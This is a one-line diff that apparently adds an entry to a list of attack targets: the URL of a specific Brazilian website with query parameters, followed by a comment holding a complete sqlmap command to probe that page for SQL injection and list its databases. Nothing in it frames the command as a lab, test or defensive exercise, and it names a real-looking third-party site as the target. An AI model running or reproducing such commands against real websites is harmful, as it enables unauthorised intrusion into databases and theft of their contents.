@@ -1,0 +1,1 @@
+http://www.frutacc.com.br/home/inicio.php?tit=6&id_c=64 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.frutacc.com.br/home/inicio.php?tit=6&id_c=64 --dbs
